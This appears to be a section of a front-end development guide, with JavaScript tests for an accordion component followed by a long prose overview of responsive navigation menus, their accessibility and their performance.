```javascript
describe('Accordion', () => {
  let accordion;
  let element;
  
  beforeEach(() => {
    element = document.createElement('div');
    element.innerHTML = `
      <div data-accordion-panel>
        <button data-accordion-trigger>Panel 1</button>
        <div data-accordion-content><div>Content 1</div></div>
      </div>
      <div data-accordion-panel>
        <button data-accordion-trigger>Panel 2</button>
        <div data-accordion-content><div>Content 2</div></div>
      </div>
    `;
    document.body.appendChild(element);
    
    accordion = new Accordion(element);
  });
  
  afterEach(() => {
    accordion.destroy();
    document.body.removeChild(element);
  });
  
  test('initializes with all panels collapsed', () => {
    accordion.panels.forEach(panel => {
      expect(panel.isExpanded).toBe(false);
      expect(panel.trigger.getAttribute('aria-expanded')).toBe('false');
    });
  });
  
  test('expands panel when trigger clicked', () => {
    const trigger = accordion.panels[0].trigger;
    trigger.click();
    
    expect(accordion.panels[0].isExpanded).toBe(true);
    expect(trigger.getAttribute('aria-expanded')).toBe('true');
  });
  
  test('collapses other panels when allowMultiple is false', () => {
    accordion.options.allowMultiple = false;
    
    accordion.expand(0);
    expect(accordion.panels[0].isExpanded).toBe(true);
    
    accordion.expand(1);
    expect(accordion.panels[0].isExpanded).toBe(false);
    expect(accordion.panels[1].isExpanded).toBe(true);
  });
  
  test('allows multiple panels when allowMultiple is true', () => {
    accordion.options.allowMultiple = true;
    
    accordion.expand(0);
    accordion.expand(1);
    
    expect(accordion.panels[0].isExpanded).toBe(true);
    expect(accordion.panels[1].isExpanded).toBe(true);
  });
  
  test('handles keyboard navigation', () => {
    const trigger0 = accordion.panels[0].trigger;
    const trigger1 = accordion.panels[1].trigger;
    
    trigger0.focus();
    
    const downEvent = new KeyboardEvent('keydown', { key: 'ArrowDown' });
    trigger0.dispatchEvent(downEvent);
    
    expect(document.activeElement).toBe(trigger1);
  });
});
```

#### Integration Tests

```javascript
describe('Accordion Integration', () => {
  test('maintains accessibility throughout interaction', async () => {
    const { container } = render(<TestAccordion />);
    
    const trigger = screen.getByRole('button', { name: /panel 1/i });
    const content = screen.getByRole('region', { hidden: true });
    
    // Initial state
    expect(trigger).toHaveAttribute('aria-expanded', 'false');
    expect(content).toHaveAttribute('aria-hidden', 'true');
    expect(content).toHaveAttribute('aria-labelledby', trigger.id);
    
    // After expansion
    await userEvent.click(trigger);
    
    expect(trigger).toHaveAttribute('aria-expanded', 'true');
    expect(content).not.toHaveAttribute('aria-hidden');
  });
  
  test('animates height smoothly', async () => {
    const { container } = render(<TestAccordion />);
    
    const content = container.querySelector('.accordion-content');
    const initialHeight = content.offsetHeight;
    
    const trigger = screen.getByRole('button', { name: /panel 1/i });
    await userEvent.click(trigger);
    
    // [Inference] Height should change during animation
    await waitFor(() => {
      expect(content.offsetHeight).toBeGreaterThan(initialHeight);
    });
  });
});
```

#### Accessibility Tests

```javascript
import { axe, toHaveNoViolations } from 'jest-axe';

expect.extend(toHaveNoViolations);

describe('Accordion Accessibility', () => {
  test('has no accessibility violations', async () => {
    const { container } = render(<TestAccordion />);
    const results = await axe(container);
    expect(results).toHaveNoViolations();
  });
  
  test('announces state changes to screen readers', async () => {
    const { container } = render(<TestAccordion />);
    
    const liveRegion = container.querySelector('[aria-live="polite"]');
    expect(liveRegion).toBeInTheDocument();
    
    const trigger = screen.getByRole('button', { name: /panel 1/i });
    await userEvent.click(trigger);
    
    await waitFor(() => {
      expect(liveRegion).toHaveTextContent(/panel 1 expanded/i);
    });
  });
});
```

This comprehensive overview covers the essential patterns, techniques, and considerations for building robust accordion/collapse components in modern web applications.

---

## Responsive Menu Systems

### Breakpoint-Driven Navigation Patterns

#### Multi-State Menu Architectures

Responsive menus transform across breakpoints, typically maintaining three distinct states: desktop horizontal navigation, tablet condensed navigation, and mobile hamburger navigation. Each state requires separate DOM structures or CSS-driven transformations of a single structure. The transformation point selection depends on content width requirements—menus break when items no longer fit comfortably, not at arbitrary pixel values. Some implementations maintain parallel DOM structures with visibility toggling, while others morph a single structure through CSS, trading DOM duplication for complexity.

#### Hybrid Navigation Strategies

Modern responsive systems often blend patterns rather than switching completely. Priority navigation keeps high-priority items visible while collapsing overflow items into a "more" menu. Progressive disclosure shows top-level categories persistently while hiding nested items until interaction. Adaptive navigation analyzes available space dynamically, collapsing items that don't fit into overflow containers. These approaches avoid the binary desktop/mobile split, providing better experiences at intermediate viewport sizes.

### Mobile Menu Activation Patterns

#### Hamburger and Trigger Button Design

The hamburger icon (three horizontal lines) serves as the standard mobile menu trigger, though alternatives include labeled "Menu" buttons, three-dot vertical icons, or custom branded triggers. The trigger must meet minimum touch target sizes (44×44px iOS, 48×48px Android) with adequate spacing from viewport edges and other interactive elements. Trigger positioning—typically top-left or top-right corners—follows platform conventions and site information architecture priorities. The trigger maintains state indication through icon transformation (hamburger → X), color changes, or ARIA attribute updates.

#### Menu Presentation Modalities

Mobile menus appear through several presentation modes. Slide-in panels overlay content, sliding from edges (left, right, top) with backdrop overlays dimming underlying content. Push panels shift page content aside rather than overlaying. Full-screen takeover modals completely replace viewport content during navigation. Sheet presentations (bottom sheets, action sheets) slide up from viewport bottoms. Each modality communicates different information hierarchies and interaction expectations—overlays suggest temporary departure from current context, while push patterns suggest navigation is part of the current flow.

#### Activation Mechanics and Timing

Menu activation involves coordinated state changes across multiple elements. Opening sequences: trigger activation → state update → backdrop appearance → panel animation → focus shift → scroll lock. CSS transitions provide animation, typically 200-400ms for perceived responsiveness without delay. Hardware-accelerated transforms (`translate3d`, `translateX`) prevent janky animations. Backdrop fade-ins occur simultaneously with panel slides. Focus management must complete before animation finishes to avoid focus indicators appearing mid-transition. Body scroll locking prevents background scrolling while menus display, implemented through `overflow: hidden`, `position: fixed`, or scroll event prevention.

### Mega Menu Systems

#### Multi-Column Content Organization

Mega menus display rich content in multi-column layouts, typically appearing on hover or click for desktop navigation. Column structures organize related links hierarchically—primary categories in column headers, secondary items beneath. Visual separators (borders, spacing, background colors) create clear content regions. Featured content areas highlight promotional items, popular pages, or contextual help. Image tiles add visual interest and recognition speed. Content density balances comprehensiveness with cognitive load—too many options paralyze decision-making.

#### Hover Intent and Trigger Debouncing

Desktop mega menus typically show on hover, but immediate triggering creates accidental activations. Hover intent algorithms detect deliberate hovering by measuring dwell time (typically 150-300ms) before revealing content. Movement direction analysis distinguishes users moving toward submenus from users passing over triggers toward other targets. Pointer trajectory prediction checks if cursor moves toward expanding menu regions. Hysteresis zones keep menus open slightly beyond trigger boundaries, preventing menus from immediately closing when cursors temporarily leave trigger areas.

#### Mega Menu Responsive Collapse

Mega menus don't translate directly to mobile—multi-column layouts overwhelm small screens. Mobile adaptations typically convert mega menus into accordion-style nested lists or multi-level drill-down patterns. Tablet viewports might show simplified mega menus with reduced columns or convert to hybrid patterns. Some implementations maintain mega menu structure but make it scrollable within mobile modal containers. The transformation strategy depends on content depth and category relationships—flat category structures adapt more easily than deep hierarchies.

### Nested Navigation and Drill-Down Patterns

#### Multi-Level Menu State Management

Nested menus maintain state across multiple hierarchy levels. Parent-child relationships require tracking which submenus remain open, preventing sibling submenus from simultaneously displaying, and managing focus across levels. State storage approaches include DOM data attributes, JavaScript state objects, or CSS-only solutions using `:target` or checkbox hack patterns. Breadcrumb trails or visual indicators communicate current depth position within multi-level hierarchies.

#### Drill-Down Animation Sequences

Mobile drill-down patterns animate transitions between menu levels. Forward navigation (into submenus) slides new content from right while sliding current content left. Backward navigation reverses direction—current content slides right, revealing previous level sliding from left. Transform-based animations maintain hardware acceleration. Height adjustments accommodate different submenu lengths without sudden jumps. Back buttons, category headers, or breadcrumb trails provide navigation affordances for returning to previous levels.

#### Persistent Navigation Context

Deep menu hierarchies risk disorienting users. Persistent elements maintain context: sticky headers showing current category, breadcrumb trails revealing navigation path, or animation sequences that maintain spatial relationships between levels. Some implementations keep parent categories partially visible during drill-down, showing users where they came from. Preview panels show category content alongside subcategory lists, helping users understand if they're heading in the right direction before committing to navigation.

### Accordion Navigation Components

#### Panel Expand/Collapse Mechanics

Accordion menus reveal content by expanding panels vertically. Single-expand accordions allow only one panel open at a time, automatically closing others when a new panel opens. Multi-expand accordions permit multiple simultaneous open panels, giving users full control. Panel state toggles through triggers—entire headers might be clickable, or dedicated icons (+ / -, chevrons, arrows) serve as explicit expansion controls. Height animations transition between collapsed and expanded states, calculated dynamically based on content or fixed to maximum heights.

#### Smooth Height Transitions

CSS height transitions face challenges—`height: auto` isn't animatable. Solutions include: animating max-height with values exceeding possible content height (creates timing issues with significantly oversized values), measuring actual content height in JavaScript and setting explicit pixel values, using transform: scaleY on wrapper elements (affects child content), or animating grid-template-rows with fr units in grid layouts. JavaScript height measurement requires triggering reflow—measurements must occur after content renders but before transition starts.

#### Accordion Accessibility Patterns

Accordions follow specific ARIA patterns for accessibility. Triggers use `role="button"` with `aria-expanded` indicating open/closed state. Panel containers use `aria-labelledby` referencing their trigger IDs. Panels receive `role="region"` when containing significant content. Focus management keeps focus on triggers during expansion/collapse—focus shouldn't jump into newly opened panels automatically. Keyboard navigation allows arrow keys to move between accordion triggers, Enter/Space to toggle expansion, and Tab to move between triggers and into expanded content.

### Off-Canvas Navigation Patterns

#### Canvas Manipulation Techniques

Off-canvas navigation hides menus outside viewport boundaries until triggered. Left off-canvas panels position at negative left coordinates (`left: -300px` or `transform: translateX(-100%)`). Content shifts through multiple approaches: overlay (panel slides over content with backdrop), push (panel and content both shift), and reveal (content slides away revealing panel underneath). Transform-based positioning performs better than left/right positioning—transforms use compositor thread rather than main thread, preventing layout thrashing during animation.

#### Multi-Panel Off-Canvas Systems

Complex applications use multiple off-canvas panels—left navigation, right filters, bottom sheets. Panel priority determines stacking order and interaction behavior. Modal panels block interaction with other interface elements. Non-modal panels allow simultaneous interactions. Stacking contexts must be managed carefully—z-index coordination prevents panels from appearing in wrong order. Multiple simultaneous open panels need clear visual hierarchy and backdrop treatment to avoid user confusion about focus context.

#### Gesture Integration for Mobile

Mobile off-canvas panels often support swipe gestures for opening and closing. Edge swipes from screen boundaries trigger panel appearance. Swipe distance determines opening amount—panels track finger position during drag. Velocity calculations determine whether to complete opening/closing when users release mid-drag—fast flicks complete action even with short drag distances. Spring physics or easing functions animate panel completion after release. Gesture conflicts with page scrolling require touch position discrimination—horizontal swipes open panels, vertical swipes scroll content.

### Fixed and Sticky Navigation Behaviors

#### Scroll-Linked Header Transformations

Navigation headers adapt to scrolling behavior. Always-visible headers remain fixed regardless of scroll position, consuming viewport space but maintaining constant access. Hide-on-scroll headers disappear when scrolling down (giving content space) and reappear when scrolling up (anticipating navigation need). Scroll threshold detection prevents headers from hiding during minimal scrolling—typically requiring 50-100px scroll distance before triggering. Directional awareness tracks whether users scroll up or down through scroll position comparison or wheel event deltaY values.

#### Position Sticky Coordination

`position: sticky` elements remain in flow until scrolling reaches specified thresholds, then fix in position. Top-level navigation uses `position: sticky; top: 0` to stick at viewport top. Nested sticky elements coordinate through stacked positioning—category headers stick below main navigation. Sticky positioning requires containing blocks with explicit heights and overflow properties. Safari's sticky implementation has edge cases requiring `-webkit-sticky` prefix and specific container setups. JavaScript sticky polyfills measure scroll positions and toggle position: fixed when thresholds cross.

#### Condensed Navigation States

Headers shrink during scrolling to reclaim vertical space. Height reduction animations transition navigation from expanded (large logo, full-height header) to condensed (small logo, compressed height). Opacity fading removes secondary elements like taglines or utility links. Content reflow must avoid layout shift—elements should transform rather than disappear suddenly. Logo scaling uses transform: scale for hardware acceleration. Shrinking triggers at specific scroll thresholds (often 100-200px) to avoid constant transformation during minor scrolling.

### Dropdown and Flyout Submenus

#### Positioning and Collision Detection

Dropdown submenus appear below triggers, but viewport constraints require smart positioning. Collision detection measures available space in all directions—if insufficient space below, menus open upward. Horizontal overflow requires shifting menus left or right to remain in viewport. Positioning calculations use `getBoundingClientRect()` for trigger positions and compare against viewport dimensions. Fallback positioning sequences try preferred positions (below, above, left, right) until finding adequate space. Fixed positioning relative to viewport versus absolute positioning relative to containers affects collision calculation complexity.

#### Multi-Level Flyout Coordination

Flyout submenus open horizontally from parent items, creating hierarchical navigation. Hover corridors maintain menu visibility when moving mouse from parent to submenu—triangular regions between parent and submenu keep menus open even when pointer temporarily leaves elements. Timeout delays prevent menus from immediately closing when cursors leave trigger areas. Sibling flyouts close when new ones open to avoid overwhelming screen space. Z-index management ensures submenus appear above parent menus. Mobile translations convert flyouts into nested vertical lists or drill-down patterns.

#### Keyboard Navigation Through Dropdowns

Keyboard users navigate dropdowns through specific patterns. Arrow keys move focus within menu items—down/up in vertical menus, left/right in horizontal menus. Right arrow opens submenus or moves into nested levels. Left arrow closes submenus or returns to parent levels. Escape closes menus and returns focus to triggers. Home/End keys jump to first/last items. Enter or Space activates focused items. Focus indicators must be clearly visible. Focus must cycle within open menus rather than escaping to page content. `aria-haspopup` and `aria-expanded` communicate menu relationships to screen readers.

### Tab-Based Mobile Navigation

#### Bottom Tab Bar Implementations

Mobile applications frequently use bottom tab bars for primary navigation. Tab bars contain 3-5 primary destinations with icons and optional labels. Active tab indication uses color, underlines, or icon style changes (filled vs. outlined). Each tab represents a distinct application section rather than filtering current content. Tab bars persist across view changes within sections. iOS Human Interface Guidelines recommend 5 items maximum; Android Material Design allows scrollable tabs if more items required. Tab bars raise touch target sizing concerns—minimum 48×48dp targets with adequate spacing prevent mis-taps.

#### Tab State Persistence

Bottom tabs maintain separate navigation stacks per tab. Switching between tabs preserves scroll positions, form states, and navigation depth within each tab. Users returning to previously visited tabs expect to resume from their last position rather than resetting to tab root. State management approaches include maintaining component trees in memory for all tabs (memory intensive), serializing and restoring state on tab changes (complex), or using router-based solutions that track navigation history per tab. Deep linking into specific tabs requires initializing appropriate tab and navigation state from URLs.

#### Tab Bar Responsive Scaling

Bottom tab bars work well on mobile but don't translate directly to tablet or desktop viewports. Adaptation strategies include converting bottom tabs to side navigation drawers, promoting tabs to horizontal top navigation, or maintaining bottom tabs on larger screens with different styling. Tablet landscape orientations particularly challenge bottom tab ergonomics—reach distance increases significantly. Some implementations keep bottom tabs for portrait orientations but switch to side navigation for landscape.

### Search-Integrated Navigation

#### Search Overlay Patterns

Search activation often presents full-screen or prominent overlays focusing user attention on search. Activation grows search inputs from compact headers or triggers dedicated search views. Autocomplete suggestions appear below inputs, showing popular searches, query completions, or instant results. Search overlays dim or blur underlying content, communicating modal context. Search scope selectors filter results to specific categories or content types. Recent search history surfaces previous queries for quick re-access. Close buttons or escape key presses dismiss overlays, returning to previous context.

#### Instant Search and Typeahead

Instant search displays results while users type, updating with each keystroke. Debouncing delays search execution until typing pauses (typically 150-300ms) to reduce unnecessary requests. Results appear in categorized sections—pages, products, articles—with "See all" links for each category. Highlighting matches keywords within results for quick scanning. Loading states during search execution prevent confusion about whether results reflect current queries. Empty states for no results suggest alternative searches or popular content. Keyboard navigation allows arrowing through results and pressing enter to navigate.

#### Search-Augmented Menu Navigation

Hybrid patterns combine traditional navigation with search. Filtering menu items by search queries helps users find categories in large navigation structures. Type-ahead highlights matching menu items as users type. Search results might include navigation categories alongside content results. Some implementations replace traditional navigation with search-first approaches—users type intent rather than browsing hierarchies. This works when search quality is high and users know what they're seeking, but fails for exploration and discovery.

### Context-Aware Navigation Patterns

#### Adaptive Navigation Based on User Context

Navigation adapts to user authentication status, role permissions, geographic location, or behavioral patterns. Logged-out users see sign-in prompts where logged-in users see account menus. Administrative interfaces appear only for users with appropriate permissions. Location-based navigation highlights local options. Personalized navigation promotes frequently accessed sections or recommends relevant content. Context detection must happen quickly—navigation appearing and disappearing during context determination creates jarring experiences. Server-side rendering with proper authentication ensures appropriate navigation loads initially rather than flashing wrong content.

#### Temporal Navigation Adjustments

Navigation changes based on temporal context. Holiday-specific navigation appears during seasonal events. Limited-time promotions get temporary navigation prominence. Business hours affect available options—service booking showing available times, restaurant ordering showing current menu. Timezone-aware systems adjust times and schedules to user locations. Event-driven navigation responds to external triggers like breaking news or system status. These adaptations require careful coordination—navigation changes shouldn't surprise users returning to familiar interfaces.

#### Progressive Enhancement for Navigation

Core navigation must function without JavaScript, progressively enhancing with scripted features. No-JS navigation uses standard links and CSS-only patterns like `:hover` and `:focus-within`. JavaScript adds smooth animations, hover intent detection, and dynamic loading. Touch support enhances mobile interactions. Intersection observers lazy-load off-screen menu content. Service workers enable offline navigation and instant subsequent visits. Each enhancement layer degrades gracefully—users with partial support still access core functionality.

### Performance Optimization for Menu Systems

#### Lazy Loading and Code Splitting

Large navigation structures with rich content split into separate code chunks loaded on-demand. Mega menu content loads when first opened rather than on page load. Deep navigation hierarchies load child levels when parents expand. Dynamic imports separate menu JavaScript from main bundles. Preloading strategies fetch menu code on hover or focus, completing before activation completes. Resource hints (`<link rel="prefetch">`) prime browser caches. Bundle size reduction from splitting must exceed overhead costs of additional requests and evaluation time.

#### Virtual Scrolling for Large Lists

Navigation with hundreds or thousands of items (e.g., country selectors, product categories) benefits from virtual scrolling. Rendering only visible items plus buffer zones reduces DOM node counts from thousands to dozens. Scroll position calculations determine which items currently appear in viewport. Absolute positioning places items at correct offsets. Item recycling reuses DOM nodes for different data as users scroll. Height estimation or measurement determines total scrollable area. Variable-height items complicate calculations requiring individual height tracking or estimation with measurement correction.

#### Animation Performance Optimization

Smooth 60fps navigation animations require careful performance optimization. Transform and opacity properties animate without triggering layout or paint—they composite only. `will-change` hints inform browsers which properties will animate, enabling optimization preparation. Layer promotion moves animated elements to separate compositor layers preventing repaint of static content. Containing blocks limit layout scope when animating children. Passive event listeners for scroll and touch events prevent blocking compositor thread. JavaScript animation using `requestAnimationFrame` synchronizes with display refresh rates. Hardware acceleration through 3D transforms forces GPU rendering.

### Accessibility in Responsive Menus

#### Screen Reader Navigation Patterns

Screen reader users navigate through semantic structure and ARIA attributes. Navigation landmarks (`<nav>` or `role="navigation"`) with `aria-label` distinguish multiple navigation regions. List structure (`<ul>`, `<li>`) communicates menu organization. Current page indication uses `aria-current="page"`. Submenu relationships require `aria-haspopup`, `aria-expanded`, and `aria-controls`. Skip links allow bypassing repetitive navigation. Mobile menu buttons need accessible names—"Menu" rather than unlabeled hamburger icons. Screen reader testing with NVDA, JAWS, and VoiceOver ensures announcement correctness.

#### Keyboard Interaction Requirements

Full keyboard operability enables navigation without pointing devices. Tab key moves between top-level menu items and into submenus. Arrow keys provide efficient navigation within menus—horizontal for menu bars, vertical for dropdowns. Enter and Space activate menu items and toggle submenus. Escape closes menus and returns focus to triggers. Home and End jump to menu boundaries. Focus visible indicators show current focus position—browsers default focus rings often require enhancement. Focus trap keeps focus within open mobile menus until deliberately closed. Roving tabindex optimizes tab order for menu lists.

#### Mobile Accessibility Considerations

Touch interfaces require additional accessibility attention. Minimum touch target sizes (44×44px) prevent frustration. Adequate spacing between interactive elements avoids accidental activation. VoiceOver swipe gestures must navigate menu items logically. TalkBack navigation flows through elements in reading order. Touch accommodation features (iOS AssistiveTouch, Android Switch Access) need consideration—menu patterns must work with alternative input methods. Reduced motion preferences disable or minimize animations. High contrast modes ensure sufficient visual distinction between navigation states.

### State Synchronization Across Menu Instances

#### Multi-Instance Menu Coordination

Sites often have multiple navigation instances—header navigation, footer navigation, mobile menu. Active page indication must synchronize across instances. Open/closed states coordinate—opening mobile menu might highlight corresponding sections in desktop navigation. URL-based state synchronization uses route matching to determine active items regardless of how navigation was triggered. Event-driven coordination dispatches events when navigation state changes, allowing multiple listeners to update accordingly. Shared state management through stores (Redux, Vuex, Zustand) centralizes navigation state.

#### Deep Link and Route-Based State

Navigation state derives from URL structure. Route matching determines active menu items—exact matches for leaf nodes, partial matches for category pages. Query parameters might affect navigation state—filters reflected in navigation selection. URL fragment identifiers can open specific menu sections. History API integration allows navigation changes without page reloads while maintaining proper back/forward button behavior. Initial state resolution happens during application bootstrap, reading URL and setting appropriate navigation state before first render.

#### Cross-Device State Persistence

User navigation preferences persist across devices and sessions. Recently accessed sections stored in localStorage or backend databases. Collapsed/expanded accordion states remember user choices. Customized navigation ordering or pinned items sync across devices. Authentication-based personalization loads from user profiles. Service workers cache navigation structure for offline availability. State serialization must be efficient—overly complex state storage impacts performance. Privacy considerations govern what persists versus what stays ephemeral.

---

